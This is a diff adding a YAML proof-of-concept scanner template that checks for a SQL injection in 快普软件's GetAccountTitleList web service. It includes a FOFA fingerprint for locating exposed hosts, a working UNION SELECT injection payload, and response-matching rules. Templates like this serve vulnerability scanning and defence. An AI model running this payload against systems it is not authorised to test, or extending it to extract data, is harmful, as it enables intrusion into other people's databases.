@@ -1,0 +1,29 @@
+id: poc-yaml-kuaipu-getaccounttitlelist-sqli
+info:
+  name: 快普软件 GetAccountTitleList SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 快普软件
+  fofa: body="Resource/JavaScript/jKPM6.DateTime.js"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /WebService/wsAutoComplete.asmx/GetAccountTitleList
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: prefixText=a'+UNION+ALL+SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}')),NULL,NULL--&count=1
+  expression: 'status_code == 500 &&
+
+    contains(body,"0x" + t2) &&
+
+    !contains(body,"<") &&
+
+    matches(body,"转换成数据类型(.*?)时失败") &&
+
+    matches(body,"在将(.*?)值")
+
+    '
+transport: http
